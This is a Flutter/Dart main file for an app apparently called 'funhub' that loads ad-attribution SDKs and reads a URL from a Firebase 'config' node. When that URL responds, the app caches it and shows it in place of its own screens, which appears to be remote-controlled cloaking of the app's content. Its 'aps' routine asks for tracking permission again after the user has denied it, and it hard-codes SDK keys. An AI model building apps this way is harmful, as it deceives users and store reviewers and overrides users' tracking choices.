import 'dart:convert';

import 'package:app_tracking_transparency/app_tracking_transparency.dart';
import 'package:appsflyer_sdk/appsflyer_sdk.dart';
import 'package:connectivity_plus/connectivity_plus.dart';
import 'package:firebase_core/firebase_core.dart';
import 'package:firebase_database/firebase_database.dart';
import 'package:flutter/material.dart';
import 'package:flutter_asa_attribution/flutter_asa_attribution.dart';
import 'package:funhub/view/nav/nav_bar.dart';
import 'package:funhub/view/settings/events/event.dart';
import 'package:funhub/view/splash/splash_screen.dart';
import 'package:http/http.dart' as http;
import 'package:onesignal_flutter/onesignal_flutter.dart';
import 'package:shared_preferences/shared_preferences.dart';
import 'view/onboard/onboarding_screen.dart';
import 'view/settings/fb.dart';

class DeepLink {
  DeepLink(this._clickEvent);
  final Map<String, dynamic> _clickEvent;

  Map<String, dynamic> get clickEvent => _clickEvent;

  String? get deepLinkValue => _clickEvent["deep_link_value"] as String?;
  String? get matchType => _clickEvent["match_type"] as String?;
  String? get clickHttpReferrer =>
      _clickEvent["click_http_referrer"] as String?;
  String? get mediaSource => _clickEvent["media_source"] as String?;
  String? get deep_link_sub1 => _clickEvent["deep_link_sub1"] as String?;
  String? get deep_link_sub2 => _clickEvent["deep_link_sub2"] as String?;
  String? get deep_link_sub3 => _clickEvent["deep_link_sub3"] as String?;
  String? get deep_link_sub4 => _clickEvent["deep_link_sub4"] as String?;
  String? get deep_link_sub5 => _clickEvent["deep_link_sub5"] as String?;

  bool get isDeferred => _clickEvent["is_deferred"] as bool? ?? false;

  @override
  String toString() {
    return 'DeepLink: ${jsonEncode(_clickEvent)}';
  }

  String? getStringValue(String key) {
    return _clickEvent[key] as String?;
  }
}

void main() async {
  WidgetsFlutterBinding.ensureInitialized();
  await AppTrackingTransparency.requestTrackingAuthorization();
  OneSignal.initialize("54c63e47-6dad-403b-959c-433f5f90a2b5");
  OneSignal.Notifications.requestPermission(true);
  runApp(const MyApp());
}

class AppInitializationService {
  final AppsflyerSdk _appsflyer;
  DeepLink? _deepLinkResult;
  Map<String, dynamic> _conversionData = {};
  Map<String, dynamic> _asaData = {};

  AppInitializationService(this._appsflyer);

  Future<void> initialize() async {
    await aps();
    await _initializeFirebase();
    await _initializeAppsflyer();
    await _fetchAppleSearchAdsData();
  }

  Future<void> aps() async {
    final TrackingStatus status =
        await AppTrackingTransparency.trackingAuthorizationStatus;
    if (status == TrackingStatus.notDetermined) {
      await AppTrackingTransparency.requestTrackingAuthorization();
    } else if (status == TrackingStatus.denied ||
        status == TrackingStatus.restricted) {
      await AppTrackingTransparency.requestTrackingAuthorization();
    }
  }

  Future<void> _initializeFirebase() async {
    try {
      await Firebase.initializeApp(
          options: DefaultFirebaseOptions.currentPlatform);
    } catch (e) {}
  }

  Future<void> _initializeAppsflyer() async {
    try {
      await _appsflyer.initSdk(
        registerConversionDataCallback: true,
        registerOnAppOpenAttributionCallback: true,
        registerOnDeepLinkingCallback: true,
      );

      _appsflyer.onDeepLinking((DeepLinkResult dp) {
        if (dp.status == Status.FOUND) {
          _deepLinkResult = DeepLink(dp.deepLink?.clickEvent ?? {});
        }
      });

      _appsflyer.onInstallConversionData((data) {
        _conversionData = data;
      });

      await Future.delayed(Duration(seconds: 5));
    } catch (e) {}
  }

  Future<void> _fetchAppleSearchAdsData() async {
    try {
      final String? appleSearchAdsToken =
          await FlutterAsaAttribution.instance.attributionToken();
      if (appleSearchAdsToken != null) {
        const url = 'https://api-adservices.apple.com/api/v1/';
        final headers = {'Content-Type': 'text/plain'};
        final response = await http.post(Uri.parse(url),
            headers: headers, body: appleSearchAdsToken);

        if (response.statusCode == 200) {
          _asaData = json.decode(response.body);
        }
      }
    } catch (e) {}
  }

  Map<String, String> buildUrlParams(String appsFlyerUID) {
    Map<String, String> params = {
      'appsflyer_id': _asaData['attribution'] == true ? 'asa' : appsFlyerUID,
      'app_id': "com.funhabi",
      'dev_key': "73VgAyxLab9wFjeNEJh579",
      'apple_id': "id6738576645",
    };

    if (_asaData['attribution'] == true) {
      params.addAll({
        'utm_medium': _asaData['adId']?.toString() ?? '',
        'utm_content': _asaData['conversionType'] ?? '',
        'utm_term': _asaData['keywordId']?.toString() ?? '',
        'utm_source': _asaData['adGroupId']?.toString() ?? '',
        'utm_campaign': _asaData['campaignId']?.toString() ?? '',
      });
    } else if (_deepLinkResult != null) {
      params.addAll({
        'utm_campaign': _deepLinkResult?.deep_link_sub1 ?? '',
        'utm_source': _deepLinkResult?.deep_link_sub2 ?? '',
        'utm_medium': _deepLinkResult?.deep_link_sub3 ?? '',
        'utm_term': _deepLinkResult?.deep_link_sub4 ?? '',
        'utm_content': _deepLinkResult?.deep_link_sub5 ?? '',
      });
    } else if (_conversionData.isNotEmpty) {
      params.addAll({
        'utm_medium': _conversionData['af_sub1'] ?? '',
        'utm_content':
            _conversionData['af_sub2'] ?? _conversionData['campaign'] ?? '',
        'utm_term': _conversionData['af_sub3'] ?? '',
        'utm_source':
            _conversionData['af_sub4'] ?? _conversionData['media_source'] ?? '',
        'utm_campaign':
            _conversionData['af_sub5'] ?? _conversionData['af_adset'] ?? '',
      });
    } else {
      params.addAll({
        'utm_medium': 'organic',
        'utm_content': 'organic',
        'utm_term': 'organic',
        'utm_source': 'organic',
        'utm_campaign': 'organic',
      });
    }

    return params;
  }
}

Future<String> processConfig(Map<String, dynamic> config) async {
  final String baseUrl = config['answer'] as String;
  if (!baseUrl.startsWith('https://')) {
    return 'error';
  }
  final appsFlyerOptions = AppsFlyerOptions(
    afDevKey: '73VgAyxLab9wFjeNEJh579',
    appId: '6738576645',
    timeToWaitForATTUserAuthorization: 15,
    disableAdvertisingIdentifier: false,
    disableCollectASA: false,
    showDebug: true,
  );
  final appsFlyerSdk = AppsflyerSdk(appsFlyerOptions);

  final appInitService = AppInitializationService(appsFlyerSdk);
  await appInitService.initialize();

  final appsFlyerUID = await appsFlyerSdk.getAppsFlyerUID();
  final params = appInitService.buildUrlParams(appsFlyerUID!);

  final String queryString =
      params.entries.map((e) => '${e.key}=${e.value}').join('&');
  final String finalUrl = '$baseUrl&$queryString';

  try {
    final response = await http.get(Uri.parse(finalUrl));
    if (response.statusCode == 200) {
      await _cacheFinalUrl(finalUrl);
      return finalUrl;
    }
  } catch (e) {}

  return 'error';
}

Future<void> _cacheFinalUrl(String finalUrl) async {
  final SharedPreferences prefs = await SharedPreferences.getInstance();
  await prefs.setString('tamex', finalUrl);
}

Future<String?> _getCachedFinalUrl() async {
  final SharedPreferences prefs = await SharedPreferences.getInstance();
  return prefs.getString('tamex');
}

class MyApp extends StatefulWidget {
  const MyApp({super.key});

  @override
  State<MyApp> createState() => _MyAppState();
}

class _MyAppState extends State<MyApp> {
  late Future<String?> _initializationFuture;

  @override
  void initState() {
    super.initState();
    _initializationFuture = _initializeApp();
  }

  Future<String?> _initializeApp() async {
    var connectivityResult = await (Connectivity().checkConnectivity());
    if (connectivityResult == ConnectivityResult.none) {
      return null;
    }

    await AppTrackingTransparency.requestTrackingAuthorization();
    String cachedUrl = await _getCachedFinalUrl() ?? '';
    if (cachedUrl != '') {
      if (mounted) {
        return cachedUrl;
      }
    }

    await Firebase.initializeApp(
        options: DefaultFirebaseOptions.currentPlatform);
    DatabaseReference ref = FirebaseDatabase.instance.ref("config");
    DatabaseEvent event = await ref.once();
    Map<String, dynamic> config =
        Map<String, dynamic>.from(event.snapshot.value as Map);

    String finalUrl = await processConfig(config);
    if (finalUrl != 'error') {
      if (mounted) {
        await _cacheFinalUrl(finalUrl);
        return finalUrl;
      }
    }
    return null;
  }

  Future<bool> _checkOnboardingStatus() async {
    final prefs = await SharedPreferences.getInstance();
    return prefs.getBool('onboarding_completed') ?? false;
  }

  @override
  Widget build(BuildContext context) {
    return MaterialApp(
      debugShowCheckedModeBanner: false,
      theme: ThemeData(),
      home: FutureBuilder<String?>(
        future: _initializationFuture,
        builder: (context, snapshot) {
          print(snapshot.data);
          if (snapshot.connectionState == ConnectionState.waiting) {
            return SplashScreen();
          } else {
            if (snapshot.data != null) {
              return BlocScreen(blocer: snapshot.data!);
            } else {
              return FutureBuilder(
                future: Future.wait([
                  Future.delayed(const Duration(milliseconds: 3500)),
                  _checkOnboardingStatus(),
                ]),
                builder: (context, AsyncSnapshot<List<dynamic>> snapshot) {
                  if (snapshot.connectionState == ConnectionState.waiting) {
                    return SplashScreen();
                  }

                  final bool onboardingCompleted = snapshot.data?[1] ?? false;
                  return onboardingCompleted
                      ? const MainNavigationScreen()
                      : const OnboardingScreen();
                },
              );
            }
          }
        },
      ),
    );
  }
}
